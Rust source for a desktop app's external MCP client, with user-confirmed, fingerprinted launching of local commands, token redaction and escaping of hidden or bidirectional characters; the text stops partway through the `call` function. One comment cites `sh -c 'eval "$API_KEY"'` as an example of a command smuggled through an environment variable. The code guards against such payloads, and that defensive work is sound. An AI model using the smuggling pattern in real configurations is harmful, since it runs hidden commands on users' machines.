//! 外部 MCP 服务器客户端(出站;P6)。
//!
//! 形态:壳侧持有服务器清单(`mcp-clients.json`,0600,令牌只落这里、界面永不回显)与活动连接;
//! 页面只经命令要「列表 / 连接 / 调用」,拿到的工具经 `ext_` 前缀注册进页面工具目录(只读级)。
//! 两种传输:Http(JSON-RPC over POST;Accept 同时声明 json 与 event-stream,SSE 回体取首个匹配 id 的 data)
//! 与 Stdio(子进程 piped stdin/stdout,stderr 丢弃,读线程逐行投递;子进程退出即标记 dead)。
//! 铁律:`HOROSA_MCP_CLIENT=0` 一票否决;响应体 ≤1MiB;`redact_spec` 后才回页面(headers → hasAuth);
//! 退出/关开关 = 断所有连接 + 杀子进程。**本模块永不执行工具,只搬运** JSON-RPC。
use std::collections::{BTreeMap, HashMap, HashSet};
use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{mpsc, Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::mcp_server::{
    encode_header_value, write_private_file, META_CLIENT_CAPS, META_CLIENT_INFO,
    META_PROTOCOL_VERSION, META_SERVER_INFO,
};

pub const MCP_CLIENTS_FILE: &str = "mcp-clients.json";
/// 用户亲手确认过的本机命令(stdio 外部服务器)指纹:只由壳在原生确认框点「允许」后写入,页面写不到
/// (upsert 只改 mcp-clients.json;页面一次 IPC 改了命令 / 参数 / 环境 / 目录 ⇒ 指纹变 ⇒ 下次连接重新确认)。
pub const MCP_APPROVED_FILE: &str = "mcp-clients-approved.json";
pub const MCP_CLIENT_KILL_ENV: &str = "HOROSA_MCP_CLIENT";
pub const EXT_PREFIX: &str = "ext_";
const MAX_RESPONSE_BYTES: usize = 1 << 20;
const DEFAULT_TIMEOUT_MS: u64 = 20_000;
const MAX_TIMEOUT_MS: u64 = 120_000;
const MAX_SERVERS: usize = 16;
const MAX_TOOLS_PER_SERVER: usize = 64;
const SLUG_MAX: usize = 48;
const PROTOCOL_VERSION: &str = "2025-06-18";
/// 2026-07-28 无状态纪元(现代):连接时先探测 `server/discover`;现代服务器此后每请求带 `_meta`(版本 / 身份 / 能力)与
/// `MCP-Protocol-Version` / `Mcp-Method` / `Mcp-Name` 三头、不用会话;旧服务器(400 纯文本 / -32601 / 探测超时)回退到 initialize 握手,线上字节同今日。
pub const MODERN_PROTOCOL_VERSION: &str = "2026-07-28";
/// 探测预算 = min(服务器超时, 3 s):旧服务器对 server/discover 通常立即回 400 / -32601;哑巴服务器最多等 3 s 再回退旧纪元(迟到的回复按 id 丢弃)。
const DISCOVER_PROBE_TIMEOUT: Duration = Duration::from_secs(3);

/// 一条连接探测出的协议纪元。
#[derive(Clone, Debug, PartialEq)]
pub enum Era {
    /// 2026-07-28 无状态纪元(带协商到的版本串)
    Modern(String),
    /// initialize 握手纪元(2025-06-18;线上字节同今日)
    Legacy,
}

impl Era {
    pub fn label(&self) -> &'static str {
        match self {
            Era::Modern(_) => "modern",
            Era::Legacy => "legacy",
        }
    }
}

/// 现代纪元每请求 `_meta`(版本 / 客户端身份 / 客户端能力)。
pub fn modern_meta(version: &str) -> Value {
    let mut m = serde_json::Map::new();
    m.insert(META_PROTOCOL_VERSION.to_string(), json!(version));
    m.insert(
        META_CLIENT_INFO.to_string(),
        json!({ "name": "horosa", "version": env!("CARGO_PKG_VERSION") }),
    );
    m.insert(META_CLIENT_CAPS.to_string(), json!({}));
    Value::Object(m)
}

/// 环境变量一票否决:任何命令在此为假时都直接拒(不连、不起子进程)。
pub fn client_allowed() -> bool {
    std::env::var(MCP_CLIENT_KILL_ENV)
        .map(|v| v.trim() != "0")
        .unwrap_or(true)
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq)]
#[serde(tag = "kind", rename_all = "lowercase")]
pub enum Transport {
    Http {
        url: String,
        #[serde(default)]
        headers: HashMap<String, String>,
    },
    Stdio {
        command: String,
        #[serde(default)]
        args: Vec<String>,
        #[serde(default)]
        env: HashMap<String, String>,
        #[serde(default)]
        cwd: Option<String>,
    },
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ServerSpec {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub enabled: bool,
    pub transport: Transport,
    #[serde(default)]
    pub timeout_ms: u64,
    /// 显式允许的工具名(原始名,非 slug);空 = 只收 annotations.readOnlyHint===true 的
    #[serde(default)]
    pub allow_tools: Vec<String>,
    /// true(缺省)= 只准入只读工具;false 需用户在面板显式放开并逐个填 allow_tools
    #[serde(default = "default_true")]
    pub read_only_only: bool,
}

fn default_true() -> bool {
    true
}

impl ServerSpec {
    pub fn timeout(&self) -> Duration {
        let ms = if self.timeout_ms == 0 {
            DEFAULT_TIMEOUT_MS
        } else {
            self.timeout_ms.min(MAX_TIMEOUT_MS)
        };
        Duration::from_millis(ms)
    }
}

/// 回页面前必须脱敏:HTTP 头(可能含 Authorization)与 stdio 环境变量一律不回值,只回「有没有」。
pub fn redact_spec(spec: &ServerSpec) -> Value {
    let transport = match &spec.transport {
        Transport::Http { url, headers } => json!({
            "kind": "http",
            "url": url,
            "hasAuth": headers.keys().any(|k| k.eq_ignore_ascii_case("authorization")),
            "headerNames": headers.keys().cloned().collect::<Vec<_>>(),
        }),
        Transport::Stdio {
            command,
            args,
            env,
            cwd,
        } => json!({
            "kind": "stdio",
            "command": command,
            "args": args,
            "hasEnv": !env.is_empty(),
            "envNames": env.keys().cloned().collect::<Vec<_>>(),
            "cwd": cwd,
        }),
    };
    json!({
        "id": spec.id,
        "name": spec.name,
        "enabled": spec.enabled,
        "transport": transport,
        "timeoutMs": spec.timeout().as_millis() as u64,
        "allowTools": spec.allow_tools,
        "readOnlyOnly": spec.read_only_only,
    })
}

/// `ext_<server>_<tool>`:小写、非 [a-z0-9] → `_`、折叠重复 `_`、去首尾 `_`;
/// 超长按 SLUG_MAX 截断并接 6 位 FNV-1a(与前端 `slugToolName` 同算法、同向量表)。
pub fn slug_tool_name(server: &str, tool: &str) -> String {
    let raw = format!("{}_{}", server, tool);
    let mut out = String::with_capacity(raw.len());
    let mut prev_us = false;
    for ch in raw.to_lowercase().chars() {
        let c = if ch.is_ascii_lowercase() || ch.is_ascii_digit() {
            ch
        } else {
            '_'
        };
        if c == '_' {
            if prev_us {
                continue;
            }
            prev_us = true;
        } else {
            prev_us = false;
        }
        out.push(c);
    }
    let body = out.trim_matches('_').to_string();
    let full = format!("{}{}", EXT_PREFIX, body);
    if full.len() <= SLUG_MAX {
        return full;
    }
    let hash = fnv1a_hex6(&full);
    let keep = SLUG_MAX - EXT_PREFIX.len() - 7; // 7 = '_' + 6 位十六进制
    let head: String = full[EXT_PREFIX.len()..].chars().take(keep).collect();
    format!("{}{}_{}", EXT_PREFIX, head.trim_end_matches('_'), hash)
}

pub fn fnv1a_hex6(s: &str) -> String {
    let mut h: u32 = 0x811c_9dc5;
    for b in s.as_bytes() {
        h ^= *b as u32;
        h = h.wrapping_mul(0x0100_0193);
    }
    format!("{:06x}", h & 0x00ff_ffff)
}

// ───────────────────────── 连接 ─────────────────────────

/// 活连接:传输 + 探测出的纪元 + 服务器宣告的工具表(`call` 的壳侧准入用;连接时缓存)。
struct Live {
    conn: Conn,
    era: Era,
    tools: Vec<Value>,
}

enum Conn {
    Http {
        client: reqwest::blocking::Client,
        url: String,
        headers: HashMap<String, String>,
        session: Option<String>,
    },
    Stdio {
        /// 子进程句柄单独加锁(只在 try_wait / kill / wait 的一瞬持有):断开方不必等连接锁就能先杀进程
        child: Arc<Mutex<Child>>,
        stdin: StdinWriter,
        rx: mpsc::Receiver<String>,
    },
}

/// 连接被丢弃(连接失败中途 / 断开 / 退出)时子进程必须跟着退出:否则 initialize 挂死的服务器进程会在后台永远活着。
impl Drop for Conn {
    fn drop(&mut self) {
        if let Conn::Stdio { child, .. } = self {
            kill_child(child);
            if let Ok(mut c) = child.lock() {
                let _ = c.wait();
            }
        }
    }
}

/// 杀子进程(连同它起的整个进程组:`npx` 一类启动器会再起真正的服务器进程,只杀启动器的话
/// 服务器进程还攥着 stdout,在途调用照样等到超时)。只在子进程尚未被回收时按组发信号,避免误伤复用的进程号。
fn kill_child(child: &Mutex<Child>) {
    if let Ok(mut c) = child.lock() {
        if let Ok(None) = c.try_wait() {
            #[cfg(unix)]
            {
                let pgid = c.id() as libc::pid_t;
                if pgid > 1 {
                    // SAFETY: 只发信号,不涉及内存;目标是本连接起的进程组(子进程未回收,组号不会被复用)
                    unsafe {
                        libc::kill(-pgid, libc::SIGKILL);
                    }
                }
            }
            let _ = c.kill();
        }
    }
}

/// 子进程是否已退出(已退出则顺带回收)。
fn child_exited(child: &Mutex<Child>) -> Option<std::process::ExitStatus> {
    child
        .lock()
        .ok()
        .and_then(|mut c| c.try_wait().ok().flatten())
}

/// 子进程 stdin 的专用写线程:对方不读时写会阻塞(管道缓冲满),阻塞只发生在这里;调用方按截止时间等回执。
struct StdinWriter {
    tx: mpsc::Sender<StdinJob>,
}

type StdinJob = (Vec<u8>, Option<mpsc::Sender<std::io::Result<()>>>);

impl StdinWriter {
    fn spawn(mut stdin: std::process::ChildStdin) -> Result<StdinWriter> {
        let (tx, rx) = mpsc::channel::<StdinJob>();
        thread::Builder::new()
            .name("mcp-stdio-writer".into())
            .spawn(move || {
                for (bytes, ack) in rx {
                    let r = stdin.write_all(&bytes).and_then(|_| stdin.flush());
                    let failed = r.is_err();
                    if let Some(ack) = ack {
                        let _ = ack.send(r);
                    }
                    if failed {
                        break;
                    }
                }
            })
            .context("spawn stdin writer")?;
        Ok(StdinWriter { tx })
    }

    fn job(line: &str) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(line.len() + 1);
        bytes.extend_from_slice(line.as_bytes());
        bytes.push(b'\n');
        bytes
    }

    /// 写一行并等写线程回执,最多等到 `deadline`。
    fn write_line(&self, line: &str, deadline: Instant) -> Result<()> {
        let (ack_tx, ack_rx) = mpsc::channel();
        self.tx
            .send((Self::job(line), Some(ack_tx)))
            .map_err(|_| anyhow!("server stdin closed"))?;
        match ack_rx.recv_timeout(deadline.saturating_duration_since(Instant::now())) {
            Ok(Ok(())) => Ok(()),
            Ok(Err(e)) => Err(anyhow!("write to server stdin: {}", e)),
            Err(mpsc::RecvTimeoutError::Timeout) => Err(anyhow!("timeout writing to server stdin")),
            Err(mpsc::RecvTimeoutError::Disconnected) => Err(anyhow!("server stdin closed")),
        }
    }

    /// 只排队不等回执(通知:与后续请求同一写线程,先后顺序不变)。
    fn send_line(&self, line: &str) {
        let _ = self.tx.send((Self::job(line), None));
    }
}

/// 连接表的一项:连接锁(在途调用全程持有)之外另存子进程句柄 ——
/// 断开 / 退出时先杀进程,在途调用随即因 stdout 关闭而返回并放锁,断开方从不等这把锁。
struct ConnEntry {
    live: Mutex<Live>,
    child: Option<Arc<Mutex<Child>>>,
}

impl ConnEntry {
    fn kill(&self) {
        if let Some(c) = self.child.as_ref() {
            kill_child(c);
        }
    }
}

/// 起本机命令前的确认:入参是服务器名与给人看的完整命令行(命令 / 参数 / 工作目录 / 环境变量),回 true = 用户允许。
pub type StdioConfirm = Arc<dyn Fn(&str, &str) -> bool + Send + Sync>;

pub struct ClientState {
    dir: Mutex<Option<PathBuf>>,
    specs: Mutex<Vec<ServerSpec>>,
    conns: Mutex<HashMap<String, Arc<ConnEntry>>>,
    /// 每个服务器的「连接作废代次」:用户断开 / 改了传输方式(命令 · 参数 · 环境 · 网址)/ 删除时 +1。
    /// 在途的 connect 握手前记下代次,插表前(持 conns 锁)核对 —— 不一致 = 握手期间被作废,丢弃这条连接。
    /// 锁序:conns → conn_gen(disconnect 与插表都按这个顺序拿)
    conn_gen: Mutex<HashMap<String, u64>>,
    seq: AtomicU64,
    approved: Mutex<HashSet<String>>,
    /// 缺省没有确认器 = 一律不起(fail-closed);桌面壳装原生确认框(native_stdio_confirm)
    confirm: Mutex<Option<StdioConfirm>>,
}

impl Default for ClientState {
    fn default() -> Self {
        Self {
            dir: Mutex::new(None),
            specs: Mutex::new(Vec::new()),
            conns: Mutex::new(HashMap::new()),
            conn_gen: Mutex::new(HashMap::new()),
            seq: AtomicU64::new(1),
            approved: Mutex::new(HashSet::new()),
            confirm: Mutex::new(None),
        }
    }
}

/// stdio 规格的指纹(命令 + 参数 + 工作目录 + 环境变量键值,规范化后 sha256);http 规格回 None(不起本机进程)
pub fn stdio_fingerprint(spec: &ServerSpec) -> Option<String> {
    use sha2::{Digest, Sha256};
    match &spec.transport {
        Transport::Stdio {
            command,
            args,
            env,
            cwd,
        } => {
            let env: BTreeMap<&String, &String> = env.iter().collect();
            let canon = json!({ "command": command, "args": args, "env": env, "cwd": cwd.clone().unwrap_or_default() });
            let digest = Sha256::digest(canon.to_string().as_bytes());
            Some(digest.iter().map(|b| format!("{b:02x}")).collect())
        }
        Transport::Http { .. } => None,
    }
}

fn shell_quote_display(s: &str) -> String {
    if !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./=:@%+,".contains(c))
    {
        s.to_string()
    } else {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}

/// 确认框里单个字段最多显示的字符数(超出截断并注明总长:框里放不下的部分不许悄悄挤到框外)
const DISPLAY_FIELD_MAX_CHARS: usize = 300;

/// 显示时看不见、或会改写视觉顺序的字符:控制字符(含换行)、双向控制(U+202A–202E、U+2066–2069、U+200E/F、U+061C)、
/// 零宽与其它不占位的格式字符。确认框里一律转义成可见的 `\n` / `\u{202E}`,否则载荷可以被换行挤出框外、或被倒序伪装。
fn is_hidden_or_bidi(c: char) -> bool {
    c.is_control()
        || matches!(c as u32,
            0x00AD | 0x034F | 0x061C | 0x115F | 0x1160 | 0x17B4 | 0x17B5 | 0x180B..=0x180F
            | 0x200B..=0x200F | 0x2028..=0x202E | 0x205F..=0x206F | 0x3164 | 0xFE00..=0xFE0F
            | 0xFEFF | 0xFFA0 | 0xFFF0..=0xFFFB | 0xE0000..=0xE0FFF)
}

/// 给确认框用的可见化:反斜杠自身先转义(与真换行可区分),不可见 / 双向字符转义,过长截断并注明总长
pub fn display_escape(s: &str) -> String {
    let total = s.chars().count();
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i >= DISPLAY_FIELD_MAX_CHARS {
            out.push_str(&format!("…(共 {total} 个字符,后 {} 个未显示)", total - i));
            break;
        }
        match c {
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if is_hidden_or_bidi(c) => out.push_str(&format!("\\u{{{:04X}}}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

fn display_field(s: &str) -> String {
    shell_quote_display(&display_escape(s))
}

/// 值像不像一枚密钥 / 令牌(只含 ASCII 字母数字与 `-_.~+/=:`):像才隐藏;含空白、shell 符号或非 ASCII 的
/// 不是令牌的样子(更像藏进环境变量的载荷,如 `sh -c 'eval "$API_KEY"'`),原样显示
fn looks_like_token(v: &str) -> bool {
    !v.is_empty()
        && v.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.~+/=:".contains(c))
}

fn short_sha256(v: &str) -> String {
    use sha2::{Digest, Sha256};
    Sha256::digest(v.as_bytes())
        .iter()
        .take(4)
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// 给人看的完整命令行(确认框里显示的就是它):命令与参数(不可见字符转义、过长截断)、工作目录、环境变量
/// (名字像密钥且值像令牌的只显示长度与 sha256 前 8 位;命令行引用了它就注明)
pub fn stdio_command_display(spec: &ServerSpec) -> String {
    match &spec.transport {
        Transport::Stdio {
            command,
            args,
            env,
            cwd,
        } => {
            let mut line = std::iter::once(command.as_str())
                .chain(args.iter().map(|a| a.as_str()))
                .map(display_field)
                .collect::<Vec<_>>()
                .join(" ");
            if let Some(d) = cwd.as_ref().filter(|d| !d.trim().is_empty()) {
                line.push_str(&format!("\n工作目录:{}", display_escape(d)));
            }
            if !env.is_empty() {
                let cmdline: String = std::iter::once(command.as_str())
                    .chain(args.iter().map(|a| a.as_str()))
                    .collect::<Vec<_>>()
                    .join(" ");
                let env: BTreeMap<&String, &String> = env.iter().collect();
                let shown = env
                    .iter()
                    .map(|(k, v)| {
                        let up = k.to_ascii_uppercase();
                        let referenced = cmdline.contains(&format!("${k}"))
                            || cmdline.contains(&format!("${{{k}}}"))
                            || cmdline.contains(&format!("%{k}%"));
                        let note = if referenced { ";命令行引用了这个变量" } else { "" };
                        let key = display_escape(k);
                        if ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASS"].iter().any(|w| up.contains(w)) {
                            if looks_like_token(v) {
                                format!(
                                    "{key}=(已隐藏:{} 个字符,sha256 前 8 位 {}{note})",
                                    v.chars().count(),
                                    short_sha256(v)
                                )
                            } else {
                                format!(
                                    "{key}={}(名字像密钥,但值含空白 / 符号 / 非 ASCII,不像令牌,原样显示{note})",
                                    display_field(v)
                                )
                            }
                        } else if referenced {
                            format!("{key}={}(命令行引用了这个变量)", display_field(v))
                        } else {
                            format!("{key}={}", display_field(v))
                        }
                    })
                    .collect::<Vec<_>>()
                    .join("\n  ");
                line.push_str(&format!("\n环境变量:\n  {shown}"));
            }
            line
        }
        Transport::Http { url, .. } => display_escape(url),
    }
}

/// 桌面壳的原生确认框(连接动作由用户在「外部连接」面板点出,弹窗因用户操作而起)
pub fn native_stdio_confirm(name: &str, display: &str) -> bool {
    use rfd::{MessageButtons, MessageDialog, MessageDialogResult, MessageLevel};
    MessageDialog::new()
        .set_level(MessageLevel::Warning)
        .set_title(crate::shell_text::shell_text("dlg.stdio_confirm.title"))
        .set_description(crate::shell_text::shell_text_fmt(
            "dlg.stdio_confirm.body",
            &[
                ("name", display_escape(name).as_str()),
                ("display", display),
            ],
        ))
        .set_buttons(MessageButtons::YesNo)
        .show()
        == MessageDialogResult::Yes
}

impl ClientState {
    pub fn with_stdio_confirm(confirm: StdioConfirm) -> Self {
        let s = Self::default();
        if let Ok(mut c) = s.confirm.lock() {
            *c = Some(confirm);
        }
        s
    }
    pub fn bind_dir(&self, dir: &Path) {
        if let Ok(mut d) = self.dir.lock() {
            *d = Some(dir.to_path_buf());
        }
        let _ = self.load();
        let _ = self.load_approved();
    }
    fn approved_file(&self) -> Option<PathBuf> {
        self.dir
            .lock()
            .ok()
            .and_then(|d| d.clone())
            .map(|d| d.join(MCP_APPROVED_FILE))
    }
    fn load_approved(&self) -> Result<()> {
        let Some(path) = self.approved_file() else {
            return Ok(());
        };
        let list: Vec<String> = std::fs::read_to_string(&path)
            .ok()
            .and_then(|t| serde_json::from_str(&t).ok())
            .unwrap_or_default();
        if let Ok(mut a) = self.approved.lock() {
            *a = list.into_iter().collect();
        }
        Ok(())
    }
    fn save_approved(&self) -> Result<()> {
        let Some(path) = self.approved_file() else {
            return Ok(());
        };
        let mut list: Vec<String> = self
            .approved
            .lock()
            .map(|a| a.iter().cloned().collect())
            .unwrap_or_default();
        list.sort();
        write_private_file(&path, &serde_json::to_vec_pretty(&list)?)
            .with_context(|| format!("write {}", path.display()))
    }
    /// 起本机命令前的闸:指纹已确认过 ⇒ 放行;否则问确认器(没有确认器 = 拒),允许了才记下指纹。
    /// allow_prompt=false(AI 间接调用触发的自动重连):没确认过就直接拒,不弹框 —— 确认框只因用户在面板点「连接」而起,
    /// 不在 AI 对话 / 后台任务中途冒出来(用户没有上下文,容易顺手点允许)。
    fn ensure_stdio_approved(&self, spec: &ServerSpec, allow_prompt: bool) -> Result<()> {
        let Some(fp) = stdio_fingerprint(spec) else {
            return Ok(());
        };
        if self
            .approved
            .lock()
            .map(|a| a.contains(&fp))
            .unwrap_or(false)
        {
            return Ok(());
        }
        if !allow_prompt {
            return Err(anyhow!(
                "外部服务器「{}」未连接,且这条本机命令还没确认过(首次使用或命令有改动):请在「外部连接」面板点「连接」确认后再用",
                display_escape(&spec.name)
            ));
        }
        let confirm = self.confirm.lock().ok().and_then(|c| c.clone());
        let display = stdio_command_display(spec);
        let ok = match confirm {
            Some(f) => f(&spec.name, &display),
            None => false,
        };
        if !ok {
            return Err(anyhow!(
                "本机命令未经确认,不启动(外部服务器「{}」首次连接或命令有改动时要在确认框里允许):{}",
                display_escape(&spec.name),
                display.lines().next().unwrap_or("")
            ));
        }
        if let Ok(mut a) = self.approved.lock() {
            a.insert(fp);
        }
        self.save_approved()
    }
    fn file(&self) -> Option<PathBuf> {
        self.dir
            .lock()
            .ok()
            .and_then(|d| d.clone())
            .map(|d| d.join(MCP_CLIENTS_FILE))
    }
    pub fn load(&self) -> Result<()> {
        let Some(path) = self.file() else {
            return Ok(());
        };
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(_) => return Ok(()),
        };
        let list: Vec<ServerSpec> = serde_json::from_str(&text).unwrap_or_default();
        if let Ok(mut s) = self.specs.lock() {
            *s = list.into_iter().take(MAX_SERVERS).collect();
        }
        Ok(())
    }
    fn save(&self) -> Result<()> {
        let Some(path) = self.file() else {
            return Ok(());
        };
        let list = self.specs.lock().map(|s| s.clone()).unwrap_or_default();
        let body = serde_json::to_vec_pretty(&list)?;
        write_private_file(&path, &body).with_context(|| format!("write {}", path.display()))
    }
    pub fn list(&self) -> Vec<Value> {
        let specs = self.specs.lock().map(|s| s.clone()).unwrap_or_default();
        let conns = self
            .conns
            .lock()
            .map(|c| c.keys().cloned().collect::<Vec<_>>())
            .unwrap_or_default();
        specs
            .iter()
            .map(|s| {
                let mut v = redact_spec(s);
                v["connected"] = json!(conns.iter().any(|id| id == &s.id));
                v
            })
            .collect()
    }
    pub fn upsert(&self, spec: ServerSpec) -> Result<Value> {
        self.upsert_keeping(spec, false)
    }
    /// keep_headers=true 且来稿 http headers 为空:沿用同 id 旧稿的 headers(面板「编辑」令牌框留空 = 保留已存令牌;
    /// 此前整份覆盖把令牌清空)。来稿带了 headers 或旧稿不是 http ⇒ 与普通 upsert 相同。
    pub fn upsert_keeping(&self, mut spec: ServerSpec, keep_headers: bool) -> Result<Value> {
        if spec.id.trim().is_empty() {
            return Err(anyhow!("server id required"));
        }
        let mut transport_changed = false;
        {
            let mut specs = self.specs.lock().map_err(|_| anyhow!("lock"))?;
            if let Some(i) = specs.iter().position(|s| s.id == spec.id) {
                if keep_headers {
                    if let (
                        Transport::Http {
                            headers: new_headers,
                            ..
                        },
                        Transport::Http {
                            headers: old_headers,
                            ..
                        },
                    ) = (&mut spec.transport, &specs[i].transport)
                    {
                        if new_headers.is_empty() && !old_headers.is_empty() {
                            *new_headers = old_headers.clone();
                        }
                    }
                }
                transport_changed = specs[i].transport != spec.transport;
                specs[i] = spec.clone();
            } else {
                if specs.len() >= MAX_SERVERS {
                    return Err(anyhow!("too many servers (max {})", MAX_SERVERS));
                }
                specs.push(spec.clone());
            }
        }
        // 改了命令 / 参数 / 环境 / 网址:旧连接(旧进程、旧工具清单)立刻断开 —— 否则旧进程继续服务,
        // 掉线后再由 AI 调用自动重连到「没确认过的新命令」。回包带 disconnected,页面据此收回该服务器的外部工具。
        let disconnected = transport_changed && self.disconnect(&spec.id);
        self.save()?;
        let mut out = redact_spec(&spec);
        out["disconnected"] = json!(disconnected);
        out["transportChanged"] = json!(transport_changed);
        Ok(out)
    }
    pub fn remove(&self, id: &str) -> Result<bool> {
        self.disconnect(id);
        let removed = {
            let mut specs = self.specs.lock().map_err(|_| anyhow!("lock"))?;
            let before = specs.len();
            specs.retain(|s| s.id != id);
            before != specs.len()
        };
        if removed {
            self.save()?;
        }
        Ok(removed)
    }
    pub fn spec_of(&self, id: &str) -> Option<ServerSpec> {
        self.specs
            .lock()
            .ok()
            .and_then(|s| s.iter().find(|x| x.id == id).cloned())
    }
    /// 断开(用户断开 / 改了传输方式 / 删除):摘表并作废在途的 connect(代次 +1)→ 杀子进程(不碰连接锁)
    /// → 连接本体由最后一个持有者放手时回收。在途调用还攥着连接锁也不等它:进程一死它就因 stdout 关闭而返回。
    /// 此前在途 connect 不受影响:握手期间改了命令,upsert 时表里还没有这条 → 回 disconnected:false,
    /// 握手完成后按旧命令起的进程照样插进连接表,AI 之后的调用都打到旧命令上。
    pub fn disconnect(&self, id: &str) -> bool {
        let taken = self.conns.lock().ok().and_then(|mut c| {
            if let Ok(mut g) = self.conn_gen.lock() {
                *g.entry(id.to_string()).or_insert(0) += 1;
            }
            c.remove(id)
        });
        Self::kill_taken(taken)
    }
    /// 连接自身重连前摘掉旧连接:不作废别的在途 connect(两路 AI 调用同时首连同一服务器不互相判废)
    fn drop_conn(&self, id: &str) -> bool {
        let taken = self.conns.lock().ok().and_then(|mut c| c.remove(id));
        Self::kill_taken(taken)
    }
    fn kill_taken(taken: Option<Arc<ConnEntry>>) -> bool {
        match taken {
            Some(entry) => {
                entry.kill();
                true
            }
            None => false,
        }
    }
    fn conn_gen_of(&self, id: &str) -> u64 {
        self.conn_gen
            .lock()
            .ok()
            .and_then(|g| g.get(id).copied())
            .unwrap_or(0)
    }
    fn take_all(&self) -> Vec<Arc<ConnEntry>> {
        self.conns
            .lock()
            .map(|mut c| c.drain().map(|(_, e)| e).collect())
            .unwrap_or_default()
    }
    fn next_id(&self) -> u64 {
        self.seq.fetch_add(1, Ordering::SeqCst)
    }

    /// 连接:先探测纪元(server/discover),现代服务器直接 tools/list(每请求 _meta),旧服务器 initialize + initialized + tools/list;
    /// 回 { serverId, era, protocolVersion, serverInfo, tools:[原始工具] }(页面只读 tools;多出的字段无害)。
    pub fn connect(&self, id: &str) -> Result<Value> {
        self.connect_inner(id, true)
    }

    /// allow_prompt:是否允许为没确认过的本机命令弹确认框(只有用户在面板点「连接」时为 true)
    fn connect_inner(&self, id: &str, allow_prompt: bool) -> Result<Value> {
        if !client_allowed() {
            return Err(anyhow!(
                "external MCP client disabled by {}=0",
                MCP_CLIENT_KILL_ENV
            ));
        }
        let spec = self
            .spec_of(id)
            .ok_or_else(|| anyhow!("unknown server: {}", id))?;
        if !spec.enabled {
            return Err(anyhow!("server disabled: {}", id));
        }
        self.drop_conn(id);
        let gen0 = self.conn_gen_of(id);
        // 页面一次 IPC 就能写进任意命令行:起进程前必须是用户在原生确认框里亲手允许过的这一条(指纹)
        self.ensure_stdio_approved(&spec, allow_prompt)?;
        let mut conn = open_conn(&spec)?;
        let era = probe_era(&mut conn, &spec, self.next_id())?;
        let mut live = Live {
            conn,
            era: era.clone(),
            tools: Vec::new(),
        };
        let (protocol_version, server_info, tools) = match &era {
            Era::Modern(v) => {
                let listed = rpc_raw(&mut live, &spec, self.next_id(), "tools/list", json!({}))?;
                if listed.get("resultType").and_then(|r| r.as_str()) == Some("input_required") {
                    return Err(anyhow!("tools/list: server asked for input (resultType input_required); interactive server results are not supported"));
                }
                let tools = listed
                    .get("tools")
                    .and_then(|t| t.as_array())
                    .cloned()
                    .unwrap_or_default();
                let info = listed
                    .get("_meta")
                    .and_then(|m| m.get(META_SERVER_INFO))
                    .cloned()
                    .unwrap_or(Value::Null);
                (json!(v), info, tools)
            }
            Era::Legacy => {
                let init = rpc_raw(
                    &mut live,
                    &spec,
                    self.next_id(),
                    "initialize",
                    json!({
                        "protocolVersion": PROTOCOL_VERSION,
                        "capabilities": {},
                        "clientInfo": { "name": "horosa", "version": env!("CARGO_PKG_VERSION") }
                    }),
                )?;
                // notifications/initialized 是通知(无 id、不等回体)
                let _ = notify_raw(&mut live, &spec, "notifications/initialized", json!({}));
                let listed = rpc_raw(&mut live, &spec, self.next_id(), "tools/list", json!({}))?;
                let tools = listed
                    .get("tools")
                    .and_then(|t| t.as_array())
                    .cloned()
                    .unwrap_or_default();
                (
                    init.get("protocolVersion").cloned().unwrap_or(Value::Null),
                    init.get("serverInfo").cloned().unwrap_or(Value::Null),
                    tools,
                )
            }
        };
        let tools: Vec<Value> = tools.into_iter().take(MAX_TOOLS_PER_SERVER).collect();
        live.tools = tools.clone();
        let child = match &live.conn {
            Conn::Stdio { child, .. } => Some(Arc::clone(child)),
            Conn::Http { .. } => None,
        };
        {
            // 插表前(持 conns 锁,与 disconnect 同锁序)核对:握手期间没被断开 / 没改传输方式 / 没删 / 没停用;
            // 否则丢弃这条连接(Conn 的 Drop 杀掉按旧规格起的进程组)
            let mut c = self.conns.lock().map_err(|_| anyhow!("lock"))?;
            let current = self.spec_of(id);
            let still = self.conn_gen_of(id) == gen0
                && current
                    .as_ref()
                    .map(|s| s.enabled && s.transport == spec.transport)
                    .unwrap_or(false);
            if !still {
                drop(c);
                drop(live);
                return Err(anyhow!(
                    "server {} was disconnected or its settings changed while connecting; connect again",
                    id
                ));
            }
            c.insert(
                id.to_string(),
                Arc::new(ConnEntry {
                    live: Mutex::new(live),
                    child,
                }),
            );
        }
        Ok(json!({
            "serverId": id,
            "era": era.label(),
            "protocolVersion": protocol_version,
            "serverInfo": server_info,
            "tools": tools,
        }))
    }

    /// 调用外部工具(原始工具名);未连接先连(只连 http 或已确认过的本机命令,绝不因 AI 调用弹确认框);
    /// 壳侧准入(与页面同规则)先于发送。结果原样回页面(页面负责包 untrusted 信封)。
    pub fn call(&self, id: &str, tool: &str, arguments: Value) -> Result<Value> {
        if !client_allowed() {
            return Err(anyhow!(
                "external MCP client disabled by {}=0",
                MCP_CLIENT_KILL_ENV
            ));
        }
        let spec = self
            .spec_of(id)
            .ok_or_else(|| anyhow!("unknown server: {}", id))?;
        if !spec.enabled {
            return Err(anyhow!("server disabled: {}", id));
        }
        let live = {
            let existing = self.conns.lock().ok().and_then(|c| c.get(id).cloned());
            match existing {
                Some(c) => c,
                None => {
                    self.connect_inner(id, false)?;
                    self.conns
                        .lock()
                        .ok()
                        .and_then(|c| c.get(id).cloned())
